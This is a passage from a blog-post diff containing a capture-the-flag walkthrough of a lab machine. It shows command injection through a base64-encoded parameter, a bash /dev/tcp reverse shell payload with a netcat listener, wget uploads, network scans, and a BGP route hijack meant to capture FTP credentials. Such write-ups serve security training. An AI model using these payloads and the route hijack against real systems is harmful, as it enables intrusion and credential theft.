+/doc &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+/css &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+/js &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+/tickets.php &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 302&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+/fonts &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+/dashboard.php &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 302&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+/debug &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 301&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+/diag.php &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 302&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;=====================================================&lt;/span&gt;
+2019/03/16 20:17:32 Finished
+&lt;span class=&quot;o&quot;&gt;=====================================================&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Most of the potentially interesting pages redirected to the login page. However, a pdf file named &lt;em&gt;“error_codes.pdf”&lt;/em&gt; was available under &lt;strong&gt;/doc&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2019-03-16/lyghtspeed-doc.png&quot; alt=&quot;Lyghtspeed /doc&quot; title=&quot;Lyghtspeed /doc&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;error_codes.pdf&lt;/strong&gt; gives a description for every error code of the Lyghtspeed Management Platform. Let’s study the meaning of codes &lt;strong&gt;45007&lt;/strong&gt; and &lt;strong&gt;45009&lt;/strong&gt; that we’ve seen ealier on the login page.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2019-03-16/lyghtspeed-codes.png&quot; alt=&quot;Lyghtspeed codes&quot; title=&quot;Lyghtspeed codes&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The string we found in the MIB is actually &lt;strong&gt;the serial number of the chassis&lt;/strong&gt; (SN#NET_45JDX23).&lt;/p&gt;
+
+&lt;p&gt;Thanks to this indication, I managed to login with the following credentials: &lt;strong&gt;admin/NET_45JDX23&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;from-command-injection-to-reverse-shell&quot;&gt;From Command Injection to Reverse Shell&lt;/h3&gt;
+
+&lt;p&gt;Once logged in, a dashboard and two other pages were accessible.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2019-03-16/lyghtspeed-dashboard.png&quot; alt=&quot;Lyghtspeed dashboard&quot; title=&quot;Lyghtspeed dashboard&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;tickets&quot;&gt;Tickets&lt;/h4&gt;
+
+&lt;p&gt;The &lt;strong&gt;“Tickets”&lt;/strong&gt; page gave a lot of clues about the second part of the exploitation. It was mentioning a Nigerian Prince having issues connecting to &lt;strong&gt;a FTP server&lt;/strong&gt;. &lt;strong&gt;BGP routing&lt;/strong&gt; among AS was also evoked.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2019-03-16/lyghtspeed-tickets.png&quot; alt=&quot;Lyghtspeed tickets&quot; title=&quot;Lyghtspeed tickets&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;diagnostics&quot;&gt;Diagnostics&lt;/h4&gt;
+
+&lt;p&gt;The “&lt;strong&gt;Diagnostics&lt;/strong&gt;” page seemed to show the output of the command &lt;code class=&quot;highlighter-rouge&quot;&gt;ps -aux | grep quagga | grep -v grep&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2019-03-16/lyghtspeed-diagnostics.png&quot; alt=&quot;Lyghtspeed diagnostics&quot; title=&quot;Lyghtspeed diagnostics&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After examining the &lt;strong&gt;POST request&lt;/strong&gt; sent when clicking on “Verify status” with Burp, it occurred that the &lt;strong&gt;check&lt;/strong&gt; parameter was the &lt;strong&gt;base64-encoding&lt;/strong&gt; of “quagga”.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2019-03-16/lyghtspeed-quagga.png&quot; alt=&quot;Lyghtspeed quagga&quot; title=&quot;Lyghtspeed quagga&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Let’s see if we can control the output by modifying this parameter:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2019-03-16/lyghtspeed-ssh.png&quot; alt=&quot;Lyghtspeed SSH&quot; title=&quot;Lyghtspeed SSH&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Indeed, the output has been modified to show everything related to “ssh”. Now, let’s try to inject other commands in order to &lt;strong&gt;get a reverse shell on the machine&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;SPOILER: The user flag can be retrieved without getting a reverse shell but it is mandatory for the rest of the box.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;road-to-reverse-shell&quot;&gt;Road to Reverse Shell&lt;/h4&gt;
+
+&lt;p&gt;This one was pretty difficult to trigger, I must have tried a dozen of different reverse shell payloads before finding the right one: &lt;code class=&quot;highlighter-rouge&quot;&gt;; /bin/bash -c &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.89/9999 0&amp;gt;&amp;amp;1&quot;&lt;/code&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Base64&lt;/strong&gt; encode the payload: &lt;em&gt;OyAvYmluL2Jhc2ggLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuODkvOTk5OSAwPiYxIg==&lt;/em&gt;&lt;/li&gt;
+  &lt;li&gt;Setup a &lt;strong&gt;local listener&lt;/strong&gt;: &lt;code class=&quot;highlighter-rouge&quot;&gt;nc -lvnp 9999&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Send the command inside the POST request via the &lt;strong&gt;check&lt;/strong&gt; parameter (Burp Repeater ).&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 9999
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 9999 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.89] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.105] 58148
+bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;25835&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
+bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
+root@r1:~#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Surprise! We’re root already.&lt;/p&gt;
+
+&lt;p&gt;The user flag can be retrieved at &lt;strong&gt;/root/user.txt&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/user.txt
+5649[...]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Half of the job is done, let’s move on to the privilege escalation phase!&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;NOTE: Only after finishing the box, I realized that I could have simply added my own ssh public key to /root/.ssh/authorized_keys, which would have allowed me to login via ssh…&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege escalation&lt;/h2&gt;
+
+&lt;p&gt;Upgrading to a &lt;strong&gt;fully interactive reverse shell&lt;/strong&gt; is a good reflex to adopt as soon as we’re dealing with a reverse shell (see my other article &lt;a href=&quot;https://www.boiteaklou.fr/Fully-interactive-reverse-shell.html&quot;&gt;Upgrading to a fully interactive reverse shell&lt;/a&gt;).&lt;/p&gt;
+
+&lt;p&gt;As a few hints suggested it, the privilege escalation part of this box is &lt;strong&gt;heavily network-related&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;network-configuration&quot;&gt;Network configuration&lt;/h3&gt;
+
+&lt;p&gt;The first step consisted in &lt;strong&gt;understanding the network topology&lt;/strong&gt; and &lt;strong&gt;examining every configuration files&lt;/strong&gt; that could give information about it.&lt;/p&gt;
+
+&lt;p&gt;The following diagram, available on the web server (&lt;a href=&quot;http://10.10.10.105/doc/diagram_for_tac.png&quot;&gt;http://10.10.10.105/doc/diagram_for_tac.png&lt;/a&gt;), was very helpful for understanding the network context:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2019-03-16/lyghtspeed-diagram.png&quot; alt=&quot;Lyghtspeed diagram&quot; title=&quot;Lyghtspeed diagram&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;network-interfaces&quot;&gt;Network interfaces&lt;/h4&gt;
+
+&lt;p&gt;The router we’re connected to has 3 network interfaces.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@r1:~# ip a
+ip a
+1: lo: &amp;lt;LOOPBACK,UP,LOWER_UP&amp;gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host
+       valid_lft forever preferred_lft forever
+8: eth0@if9: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu 1500 qdisc noqueue state UP group default qlen 1000
+    link/ether 00:16:3e:d9:04:ea brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet 10.99.64.2/24 brd 10.99.64.255 scope global eth0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::216:3eff:fed9:4ea/64 scope link
+       valid_lft forever preferred_lft forever
+10: eth1@if11: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu 1500 qdisc noqueue state UP group default qlen 1000
+    link/ether 00:16:3e:8a:f2:4f brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet 10.78.10.1/24 brd 10.78.10.255 scope global eth1
+       valid_lft forever preferred_lft forever
+    inet6 fe80::216:3eff:fe8a:f24f/64 scope link
+       valid_lft forever preferred_lft forever
+12: eth2@if13: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu 1500 qdisc noqueue state UP group default qlen 1000
+    link/ether 00:16:3e:20:98:df brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet 10.78.11.1/24 brd 10.78.11.255 scope global eth2
+       valid_lft forever preferred_lft forever
+    inet6 fe80::216:3eff:fe20:98df/64 scope link
+       valid_lft forever preferred_lft forever
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;bgp-configuration&quot;&gt;BGP configuration&lt;/h4&gt;
+
+&lt;p&gt;The BGP configuration is available in &lt;strong&gt;/etc/quagga/bgpd.conf&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@r1:~# &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/quagga/bgpd.conf
+&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/quagga/bgpd.conf
+&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; Zebra configuration saved from vty
+&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;   2018/07/02 02:14:27
+&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;
+route-map to-as200 permit 10
+route-map to-as300 permit 10
+&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;
+router bgp 100
+ bgp router-id 10.255.255.1
+ network 10.101.8.0/21
+ network 10.101.16.0/21
+ redistribute connected
+ neighbor 10.78.10.2 remote-as 200
+ neighbor 10.78.11.2 remote-as 300
+ neighbor 10.78.10.2 route-map to-as200 out
+ neighbor 10.78.11.2 route-map to-as300 out
+&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;
+line vty
+&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;routing-table&quot;&gt;Routing table&lt;/h4&gt;
+
+&lt;p&gt;The routing table can be displayed using &lt;code class=&quot;highlighter-rouge&quot;&gt;ip r&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@r1:~# ip r
+ip r
+default via 10.99.64.1 dev eth0 onlink
+10.78.10.0/24 dev eth1  proto kernel  scope link  src 10.78.10.1
+10.78.11.0/24 dev eth2  proto kernel  scope link  src 10.78.11.1
+10.99.64.0/24 dev eth0  proto kernel  scope link  src 10.99.64.2
+10.100.10.0/24 via 10.78.10.2 dev eth1  proto zebra
+10.100.11.0/24 via 10.78.10.2 dev eth1  proto zebra
+10.100.12.0/24 via 10.78.10.2 dev eth1  proto zebra
+10.100.13.0/24 via 10.78.10.2 dev eth1  proto zebra
+10.100.14.0/24 via 10.78.10.2 dev eth1  proto zebra
+10.100.15.0/24 via 10.78.10.2 dev eth1  proto zebra
+10.100.16.0/24 via 10.78.10.2 dev eth1  proto zebra
+10.100.17.0/24 via 10.78.10.2 dev eth1  proto zebra
+10.100.18.0/24 via 10.78.10.2 dev eth1  proto zebra
+10.100.19.0/24 via 10.78.10.2 dev eth1  proto zebra
+10.100.20.0/24 via 10.78.10.2 dev eth1  proto zebra
+10.120.10.0/24 via 10.78.11.2 dev eth2  proto zebra
+10.120.11.0/24 via 10.78.11.2 dev eth2  proto zebra
+10.120.12.0/24 via 10.78.11.2 dev eth2  proto zebra
+10.120.13.0/24 via 10.78.11.2 dev eth2  proto zebra
+10.120.14.0/24 via 10.78.11.2 dev eth2  proto zebra
+10.120.15.0/24 via 10.78.11.2 dev eth2  proto zebra
+10.120.16.0/24 via 10.78.11.2 dev eth2  proto zebra
+10.120.17.0/24 via 10.78.11.2 dev eth2  proto zebra
+10.120.18.0/24 via 10.78.11.2 dev eth2  proto zebra
+10.120.19.0/24 via 10.78.11.2 dev eth2  proto zebra
+10.120.20.0/24 via 10.78.11.2 dev eth2  proto zebra
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;updated-network-diagram&quot;&gt;Updated network diagram&lt;/h4&gt;
+
+&lt;p&gt;From the network configuration files, we can deduce the &lt;strong&gt;IP address of other AS routers&lt;/strong&gt;, as well as the &lt;strong&gt;subnets connected to these AS&lt;/strong&gt;. This gives the following updated diagram:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2019-03-16/updated-diagram.png&quot; alt=&quot;Updated diagram&quot; title=&quot;Updated diagram&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;whats-the-plan&quot;&gt;What’s the plan?&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;We know from the tickets on the web server, that there is &lt;strong&gt;a valuable FTP server&lt;/strong&gt; in the &lt;strong&gt;10.120.15.0/24 network&lt;/strong&gt;.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Routes are &lt;strong&gt;dynamically advertised via BGP&lt;/strong&gt; and we have control over a &lt;strong&gt;BGP router&lt;/strong&gt;.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;The &lt;strong&gt;priority of BGP routes&lt;/strong&gt; depends on the &lt;strong&gt;size of the advertised subnet&lt;/strong&gt; (i.e. a route to 10.120.15.0/25 will be given a higher priority than one announcing 10.120.15.0/24).&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;If we sum up all of these assumptions, we should be able to &lt;strong&gt;advertise a fake route to the FTP server&lt;/strong&gt; to our BGP neighbours so &lt;strong&gt;the Nigerian Prince will try to connect to a server inside our own subnet&lt;/strong&gt;. Since we want to &lt;strong&gt;steal his credentials&lt;/strong&gt;, we will need to &lt;strong&gt;setup an FTP server&lt;/strong&gt; which will ask for a login and a password to anyone contacting it. Once those credentials stolen, we will stop advertising the fake route and connect to the real FTP server with the Nigerian Prince’s logins.&lt;/p&gt;
+
+&lt;p&gt;Because a picture speaks a thousand words:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2019-03-16/attack.png&quot; alt=&quot;Attack&quot; title=&quot;Attack&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Alright, it is time to move on to the realization.&lt;/p&gt;
+
+&lt;h3 id=&quot;1012015024-scanning&quot;&gt;10.120.15.0/24 scanning&lt;/h3&gt;
+
+&lt;p&gt;We know the FTP server is somewhere inside the 10.120.15.0/24 subnet  but we don’t have its &lt;strong&gt;exact IP address&lt;/strong&gt;. A simple &lt;strong&gt;bash script executing &lt;code class=&quot;highlighter-rouge&quot;&gt;ping&lt;/code&gt; on the whole subnet&lt;/strong&gt; was enough to find out which hosts were up.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;then
+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Usage ./pingscript.sh [network]&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;else
+        for &lt;/span&gt;x &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;seq 1 254&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
+                &lt;/span&gt;ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;.&lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;64 bytes&quot;&lt;/span&gt; | cut &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot; &quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f4&lt;/span&gt; | sed &lt;span class=&quot;s1&quot;&gt;'s/.$//'&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;done
+fi&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This script can be &lt;strong&gt;uploaded to r1&lt;/strong&gt; using &lt;code class=&quot;highlighter-rouge&quot;&gt;wget&lt;/code&gt; on a &lt;strong&gt;local webserver running on our machine&lt;/strong&gt; that we have just set up with &lt;code class=&quot;highlighter-rouge&quot;&gt;python -m SimpleHTTPServer&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@r1:~# wget http://10.10.14.89:8000/pingscript.sh &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; /tmp/script.sh
+wget http://10.10.14.89:8000/pingscript.sh &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; /tmp/script.sh
+&lt;span class=&quot;nt&quot;&gt;--2019-03-17&lt;/span&gt; 13:26:31--  http://10.10.14.89:8000/pingscript.sh
+Connecting to 10.10.14.89:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 182 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;text/x-sh]
+Saving to: ‘/tmp/script.sh’
+
+     0K                                                       100% 19.6M&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0s
+
+2019-03-17 13:26:31 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;19.6 MB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - ‘/tmp/script.sh’ saved &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;182/182]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The result of the execution revealed two hosts: &lt;strong&gt;10.120.15.1&lt;/strong&gt; and &lt;strong&gt;10.120.15.10&lt;/strong&gt;.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@r1:~# chmod +x /tmp/script.sh
+chmod +x /tmp/script.sh
+root@r1:~# /tmp/script.sh 10.120.15
+/tmp/script.sh 10.120.15
+10.120.15.1
+10.120.15.10
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Using the same technique as previously, I have uploaded &lt;strong&gt;a static version of &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt;&lt;/strong&gt; in order to &lt;strong&gt;scan the two hosts&lt;/strong&gt; with more details.&lt;/p&gt;
+
+&lt;h4 id=&quot;10120151&quot;&gt;10.120.15.1&lt;/h4&gt;
+
+&lt;p&gt;The scan on the first host found didn’t show any FTP server.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@r1:~# /tmp/nmap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 10.120.15.1
+/tmp/nmap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 10.120.15.1
+
+Starting Nmap 6.49BETA1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; http://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2019-03-17 13:36 UTC
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
+PORT    STATE SERVICE
+22/tcp  open  ssh
+179/tcp open  bgp
+
+Read data files from: /etc
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;1.59 seconds
+Raw packets sent: 1210 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;53.216KB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 1208 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;48.388KB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;101201510&quot;&gt;10.120.15.10&lt;/h4&gt;
+
+&lt;p&gt;10.120.15.10 seems to be our guy!&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@r1:~# /tmp/nmap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 10.120.15.10
+/tmp/nmap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 10.120.15.10
+
+Starting Nmap 6.49BETA1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; http://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2019-03-17 13:38 UTC
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+53/tcp open  domain
+
+Read data files from: /etc
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;1.60 seconds
+Raw packets sent: 1210 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;53.216KB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 1208 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;48.392KB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We can now move on to the &lt;strong&gt;BGP Hijacking&lt;/strong&gt; part.&lt;/p&gt;
+
+&lt;h3 id=&quot;bgp-hijacking&quot;&gt;BGP Hijacking&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;NOTE: The way I did BGP Hijacking was not the intended one, but it was much easier and faster. For a clear explanation of the intended method, I recommend you to watch &lt;a href=&quot;https://www.youtube.com/watch?v=2ZxRA8BgmnA&quot;&gt;ippsec’s video&lt;/a&gt; or to read &lt;a href=&quot;https://0xdf.gitlab.io/2019/03/16/htb-carrier.html&quot;&gt;0xdf’s writeup&lt;/a&gt;.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;fake-route-advertising&quot;&gt;Fake route Advertising&lt;/h4&gt;
+
+&lt;p&gt;Quagga routers can be administrated via &lt;code class=&quot;highlighter-rouge&quot;&gt;vtysh&lt;/code&gt;. In order to &lt;strong&gt;advertise a route to the BGP neighbors&lt;/strong&gt;, the following commands are enough:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@r1:~# vtysh
+vtysh
+
+Hello, this is Quagga &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;version 0.99.24.1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Copyright 1996-2005 Kunihiro Ishiguro, et al.
+
+r1# conf t
+conf t
+r1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;config&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# router bgp 100&lt;/span&gt;
+router bgp 100
+r1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;config-router&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# network 10.120.15.0/25&lt;/span&gt;
+network 10.120.15.0/25
+r1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;config-router&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# exit&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;exit
+&lt;/span&gt;r1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;config&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# exit&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
